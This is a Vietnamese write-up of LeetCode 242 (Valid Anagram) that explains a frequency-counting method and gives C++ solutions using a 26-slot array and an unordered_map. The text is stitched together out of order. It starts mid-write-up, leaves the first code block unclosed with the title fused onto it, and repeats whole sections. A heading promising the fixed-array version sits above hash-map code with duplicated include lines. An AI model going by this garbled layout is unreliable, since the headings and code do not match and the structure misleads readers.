### Cách 1: Bảng đếm tần suất / Cân bằng số đếm (Khuyên dùng - Optimal)
Thay vì tạo 2 Bảng băm (Hash Map) để đếm số lượng ký tự của từng chuỗi rồi so sánh, ta áp dụng nguyên lý **"Cán cân thanh toán"**:
1. **Kiểm tra độ dài:** Nếu $s.length() \neq t.length()$, hai chuỗi không thể là anagram $\rightarrow$ Trả về `false` ngay lập tức (Early Exit).
2. **Cập nhật tần suất:** Duyệt qua từng vị trí $i$ của cả hai chuỗi đồng thời:
   * Ký tự $s[i]$ xuất hiện bên $s$: **Cộng 1** vào bảng đếm.
   * Ký tự $t[i]$ xuất hiện bên $t$: **Trừ 1** khỏi bảng đếm.
3. **Kiểm tra số dư:** Sau khi duyệt xong, nếu $s$ và $t$ chứa tập hợp ký tự hoàn toàn giống nhau, tất cả các vị trí đếm phải triệt tiêu về $0$. Nếu tồn tại bất kỳ ký tự nào có số dư khác $0$, trả về `false`.

---

## 3. Cài đặt thuật toán (C++)

### Phương án A: Tối ưu bộ nhớ với Mảng cố định (Dành cho chữ cái $a \rightarrow z$)
Vì điều kiện mặc định của đề bài chỉ gồm các chữ cái tiếng Anh in thường, ta dùng mảng `int count[26]` thay cho Hash Map để đạt hiệu năng tối đa.

```cpp
#include <string>
#include <vector>

using namespace std;

class Solution {
public:
    bool isAnagram(string s, string t) {
        if (s.length() != t.length()) return false;

        int count[26] = {0};

        for (int i = 0; i < s.length(); i++) {
            count[s[i] - 'a']++;
            count[t[i] - 'a']--;
        }

        for (int i = 0; i < 26; i++) {
            if (count[i] != 0) {
                return false;
            }
        }

        return true;
    }
};# Write-up: LeetCode 242 - Valid Anagram

* **Độ khó:** Easy
* **Dạng bài (Pattern):** Hash Table / Frequency Counting / Array
* **Đường dẫn:** [242. Valid Anagram](https://leetcode.com/problems/valid-anagram/)

---

## 1. Tóm tắt đề bài
Cho hai chuỗi $s$ và $t$. Kiểm tra xem $t$ có phải là **từ đảo chữ** (anagram) của $s$ hay không. 

> **Anagram là gì?** Hai chuỗi là anagram của nhau nếu chúng được tạo thành từ cùng một tập hợp các ký tự với số lần xuất hiện của mỗi ký tự hoàn toàn giống nhau, chỉ khác biệt ở thứ tự sắp xếp.

---

## 2. Tư duy giải thuật (Intuition)

### Cách 1: Bảng đếm tần suất / Cân bằng số đếm (Khuyên dùng - Optimal)
Thay vì tạo 2 Bảng băm (Hash Map) để đếm số lượng ký tự của từng chuỗi rồi so sánh, ta áp dụng nguyên lý **"Cán cân thanh toán"**:
1. **Kiểm tra độ dài:** Nếu $s.length() \neq t.length()$, hai chuỗi không thể là anagram $\rightarrow$ Trả về `false` ngay lập tức (Early Exit).
2. **Cập nhật tần suất:** Duyệt qua từng vị trí $i$ của cả hai chuỗi đồng thời:
   * Ký tự $s[i]$ xuất hiện bên $s$: **Cộng 1** vào bảng đếm.
   * Ký tự $t[i]$ xuất hiện bên $t$: **Trừ 1** khỏi bảng đếm.
3. **Kiểm tra số dư:** Sau khi duyệt xong, nếu $s$ và $t$ chứa tập hợp ký tự hoàn toàn giống nhau, tất cả các vị trí đếm phải triệt tiêu về $0$. Nếu tồn tại bất kỳ ký tự nào có số dư khác $0$, trả về `false`.

---

## 3. Cài đặt thuật toán (C++)

### Phương án A: Tối ưu bộ nhớ với Mảng cố định (Dành cho chữ cái $a \rightarrow z$)
Vì điều kiện mặc định của đề bài chỉ gồm các chữ cái tiếng Anh in thường, ta dùng mảng `int count[26]` thay cho Hash Map để đạt hiệu năng tối đa.

```cpp
#include <string>
#include <vector>

#include <string>
#include <unordered_map>

using namespace std;

class Solution {
public:
    bool isAnagram(string s, string t) {
        if (s.length() != t.length()) return false;

        unordered_map<char, int> charCount;

        // Đếm tần suất xuất hiện
        for (int i = 0; i < s.length(); i++) {
            charCount[s[i]]++;
            charCount[t[i]]--;
        }

        // C++17 Structured Binding: Tách trực tiếp [key, value]
        for (auto const& [key, value] : charCount) {
            if (value != 0) {
                return false;
            }
        }

        return true;
    }
};

        
